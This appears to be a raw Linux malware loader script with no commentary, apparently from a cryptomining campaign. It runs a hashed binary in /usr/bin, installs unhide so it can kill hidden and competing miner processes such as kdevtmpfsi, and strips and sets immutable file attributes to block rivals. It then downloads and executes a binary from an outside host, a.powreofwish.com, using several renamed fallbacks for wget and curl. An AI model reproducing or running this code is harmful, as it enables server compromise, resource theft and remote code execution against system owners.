PATH=$PATH:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin

cd /usr/bin

if [ -x "/usr/bin/md5sum" -o -x "/bin/md5sum" ];then
	sum=`md5sum pamdicks|grep b5a9c7bd8fdb2b6e5c4431a90b83010f|grep -v grep |wc -l`
	if [ $sum -eq 1 ]; then
		chmod +x /usr/bin/pamdicks
		/usr/bin/pamdicks
		exit 0
	fi
fi

sleep 1

if [ -x "$(command -v apt-get)" ]; then
export DEBIAN_FRONTEND=noninteractive
apt-get install -y unhide
fi

sleep 1

if [ -x "$(command -v yum)" ]; then
yum install -y epel-release
yum install -y unhide
fi

sleep 1

unhide quick |grep PID:|awk '{print $4}'|xargs -I % kill -9 % 2>/dev/null
ps aux | grep -v grep | grep 'hearme' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'cc' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'pc' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'xr' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'png' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
pkill cc
pkill pc
pkill xr
pkill png
pkill kdevtmpfsi

sleep 1

/usr/bin/chattr -i /usr/bin/pamdicks
/usr/bin/chattr -i /var/lib/cc
/usr/bin/t -i /usr/bin/pamdicks
/usr/bin/t -i /var/lib/cc
/bin/rm -rf /usr/bin/pamdicks
/bin/rm -rf /var/lib/cc

/usr/bin/chattr -i /tmp/kdevtmpfsi
echo 1 > /tmp/kdevtmpfsi
/usr/bin/chattr +i /tmp/kdevtmpfsi

/usr/bin/t -i /tmp/kdevtmpfsi
echo 1 > /tmp/kdevtmpfsi
/usr/bin/t +i /tmp/kdevtmpfsi

if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
   wget -c http://a.powreofwish.com/cc -O /var/lib/cc && chmod +x /var/lib/cc && /var/lib/cc
elif [ -x "/usr/bin/curl"  -o  -x "/bin/curl" ]; then
   curl -fs http://a.powreofwish.com/cc -o /var/lib/cc && chmod +x /var/lib/cc && /var/lib/cc
elif [ -x "/usr/bin/wge"  -o  -x "/bin/wge" ]; then
   wge -c http://a.powreofwish.com/cc -O /var/lib/cc && chmod +x /var/lib/cc && /var/lib/cc
elif [ -x "/usr/bin/get"  -o  -x "/bin/get" ]; then
   get -c http://a.powreofwish.com/cc -O /var/lib/cc && chmod +x /var/lib/cc && /var/lib/cc
elif [ -x "/usr/bin/cur"  -o  -x "/bin/cur" ]; then
   cur -fs http://a.powreofwish.com/cc -o /var/lib/cc && chmod +x /var/lib/cc && /var/lib/cc
elif [ -x "/usr/bin/url"  -o  -x "/bin/url" ]; then
   url -fs http://a.powreofwish.com/cc -o /var/lib/cc && chmod +x /var/lib/cc && /var/lib/cc
else
   rpm -e --nodeps wget
   yum -y install wget
   wget -c http://a.powreofwish.com/cc -O /var/lib/cc && chmod +x /var/lib/cc && /var/lib/cc
fi
